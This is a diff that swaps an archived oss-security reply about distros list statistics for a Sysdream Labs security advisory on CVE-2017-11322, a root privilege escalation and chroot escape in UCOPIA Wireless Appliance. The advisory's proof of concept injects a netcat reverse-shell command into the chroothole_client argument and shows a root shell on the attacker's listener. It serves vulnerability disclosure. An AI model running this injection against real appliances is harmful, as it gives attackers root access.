@@ -1,35 +1,97 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/11/13/6
-Message-ID: <CA+aC4kvjfSt0ijv_tUNRNNLzSh9-qhuC1X_tpzPVT0hU2iskRw@mail.gmail.com>
-Date: Mon, 13 Nov 2017 07:46:28 -0800
-From: Anthony Liguori <anthony@...emonkey.ws>
-To: oss-security@...ts.openwall.com
-Subject: Re: (linux-)distros list use statistics
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/29/3
+Message-ID: <0495fde6-eee0-e1e3-a58d-dc3fe4dcebf1@sysdream.com>
+Date: Fri, 29 Sep 2017 15:02:24 +0200
+From: Sysdream Labs <labs@...dream.com>
+To: fulldisclosure@...lists.org
+Cc: oss-security@...ts.openwall.com
+Subject: [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges Escalation
 Content-Type: text/plain; charset=utf-8
 
-On Mon, Nov 13, 2017 at 7:10 AM, Solar Designer <solar@...nwall.com> wrote:
-> Hi,
->
-> I think it's time for Gentoo and/or Amazon to share with all of us the
-> statistics they should have collected so far as per:
->
-> http://oss-security.openwall.org/wiki/mailing-lists/distros#contributing-back
->
-> "13. Keep track of per-report and per-issue handling and disclosure
-> timelines (at least times of notification of the private list and of
-> actual public disclosure), at regular intervals produce and share
-> statistics (most notably, the average embargo duration) as well as the
-> raw data (except on issues that are still under embargo) by posting to
-> oss-security - primary: Gentoo, backup: Amazon"
->
-> Please do.
+# [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges Escalation
 
-Ack.
+## Asset description
 
-Regards,
+UCOPIA solutions bring together a combination of software, appliance and cloud services serving small to large customers.
 
-Anthony Liguori
+More than 12,000 UCOPIA solutions are deployed and maintained by UCOPIA expert partners all over the world.
 
-> Thanks,
->
-> Alexander
+The affected asset in this report is a WiFi management appliance.
+
+## Vulnerability
+
+CHROOT escape and privileges escalation.
+
+**Threat**
+
+Improper sanitization of system commands in the chroothole_client executable in UCOPIA Wireless Appliance, prior to 5.1.8, allows local attackers to elevate privileges to root user and escape from the *chroot*.
+
+**CVE ID**: CVE-2017-11322
+
+**Access Vector**: local
+
+**Security Risk**: high
+
+**Vulnerability**: CWE-78
+
+**CVSS Base Score**: 8.2 (High)
+
+**CVSS Vector**: CVSS:3.0/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
+
+### Proof of Concept: chroot escape / privileges escalation
+
+The **chroothole_client** binary is used by the appliance to run programs outside the *chroot*, as the **root** user.
+
+Because of an improper sanitization of system commands, we managed to gain a complete **root** access to the appliance, outside the *chroot*.
+
+```
+$ chroothole_client '/usr/sbin/status'
+is not running ... failed !
+$ chroothole_client '/usr/sbin/status $(which nc)'
+/bin/nc is not running ... failed!
+$ chroothole_client '/usr/sbin/status $(nc 10.0.0.125 4444 -e /bin/sh)'
+```
+
+Attacker terminal :
+
+```
+$ ncat -lvp 4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.0.0.1:49156.
+whoami
+root
+```
+
+## Solution
+
+Update to UCOPIA 5.1.8
+
+## Timeline (dd/mm/yyyy)
+
+* 08/03/2017 : Vulnerability discovery.
+* 03/05/2017 : Initial contact.
+* 10/05/2017 : GPG Key exchange.
+* 10/05/2017 : Advisory sent to vendor.
+* 17/05/2017 : Request for feedback.
+* 22/05/2017 : Vendor acknowledge the vulnerabilities.
+* 21/06/2017 : Sysdream Labs request for an ETA, warning for public disclosure.
+* 21/06/2017 : Vendor say that the UCOPIA 5.1.8 fixes the issue.
+* 29/09/2017 : Public disclosure.
+
+## Credits
+
+* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)
+
+-- 
+SYSDREAM Labs <labs@...dream.com>
+
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
